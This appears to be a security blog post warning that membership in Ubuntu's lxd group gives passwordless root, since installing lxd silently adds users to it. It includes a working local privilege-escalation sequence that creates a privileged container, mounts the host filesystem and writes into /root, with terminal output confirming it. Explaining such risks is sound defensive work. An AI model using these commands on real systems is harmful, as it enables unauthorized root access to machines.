---
layout: post
title:  "Privilege Escalation via lxd"
date:   2017-09-27 00:00:00 +0100
categories: [lxd]
description: A super simple way to escalate if you find yourself a member of the lxd group
image:
  feature: lxd.jpg
  credit:
  creditlink:
---

LXD is Ubuntu's container manager utilising linux containers.  It could be considered to act in the same sphere as docker, 

The lxd group should be considered harmful in the same way the [docker](https://www.andreas-jung.com/contents/on-docker-security-docker-group-considered-harmful) group is.  Under no circumstances should a user in a local container be given access to the lxd group.  This is because it's entirely trivial to exploit.  

Firstly, I'd check if your user is a member of this group, because chances are that if you've installed it and are a sudoer, that you are.  Upon installation, lxd automatically adds every user to the lxd group.  Whilst this could be considered okay, considering that a sudoer automatically has root access, it forgets that sudo has auditing capabilities in place, and does require a password to perform any actions that would be required by root.  In fact, merely installing lxd is equivalent to adding the following in your sudoers file.

```bash
admin    ALL=NOPASSWD: ALL
```

If someone gains access to the admin account then immediately they have full root access without a password.  Consider an ssh private key escaping into the wild or an outdated service running under this user, and suddenly an attacker who still hasn't cracked the admin accounts password has full root access, all because you installed lxd. 

```bash
ubuntu@ubuntu:~$ cat /etc/passwd | grep 1000 
ubuntu:x:1000:1000:ubuntu,,,:/home/ubuntu:/bin/bash 
ubuntu@ubuntu:~$ cat /etc/group | grep ubuntu 
adm:x:4:syslog,ubuntu 
cdrom:x:24:ubuntu 
sudo:x:27:ubuntu 
dip:x:30:ubuntu 
plugdev:x:46:ubuntu 
lpadmin:x:113:ubuntu 
ubuntu:x:1000: 
sambashare:x:128:ubuntu 
ubuntu@ubuntu:~$ sudo su 
[sudo] password for ubuntu:  
root@ubuntu:/home/ubuntu# apt-get install lxd 
----SNIP----
root@ubuntu:/home/ubuntu# cat /etc/passwd | grep 1000 
ubuntu:x:1000:1000:ubuntu,,,:/home/ubuntu:/bin/bash 
root@ubuntu:/home/ubuntu# cat /etc/group | grep ubuntu 
adm:x:4:syslog,ubuntu 
cdrom:x:24:ubuntu 
sudo:x:27:ubuntu 
dip:x:30:ubuntu 
plugdev:x:46:ubuntu 
lpadmin:x:113:ubuntu 
ubuntu:x:1000: 
sambashare:x:128:ubuntu 
lxd:x:129:ubuntu 
```

I'm not arguing against the existence of the lxd group, merely that it increases your attack surface without notifying the user at all.  Discovering this was down to a user not realising the power this group gave their account, and whilst sudo privilege was removed, lxd access was not. 

Exploiting
-----------
So it's all good me harping on about the security risks but lets see it in action.  I only found this thanks to [#2003](https://github.com/lxc/lxd/issues/2003)

```bash
ubuntu@ubuntu:~$ lxc init ubuntu:16.04 test -c security.privileged=true 
Creating test 
ubuntu@ubuntu:~$ lxc config device add test whatever disk source=/ path=/mnt/root recursive=true 
Device whatever added to test 
ubuntu@ubuntu:~$ lxc start test 
ubuntu@ubuntu:~$ lxc exec test bash 
```

Here we have created an lxc container, assigned it security privileges and mounted the full disk under `/mnt/root`.  

```bash
ubuntu@ubuntu:~$ lxc exec test bash 
root@test:~# cd /mnt/root 
root@test:/mnt/root# ls 
bin   cdrom  etc   initrd.img  lib64       media  opt   root  sbin  srv  tmp  var 
boot  dev    home  lib         lost+found  mnt    proc  run   snap  sys  usr  vmlinuz 
root@test:/mnt/root# cd root 
root@test:/mnt/root/root# ls 
root@test:/mnt/root/root# touch ICanDoWhatever 
root@test:/mnt/root/root# exit 
exit 
ubuntu@ubuntu:~$ cat /root/ICanDoWhatever 
cat: /root/ICanDoWhatever: Permission denied 
ubuntu@ubuntu:~$ sudo su 
root@ubuntu:/home/ubuntu# cat /root/ICanDoWhatever 
root@ubuntu:/home/ubuntu# ls /root 
ICanDoWhatever 
root@ubuntu:/home/ubuntu#  
```

So now see how we haven't once typed our password in or escalated privileges manually.  We could even remove ourselves from sudoers and do all this, making root escalation trivial.  Lesson learnt, use the lxd group with care.
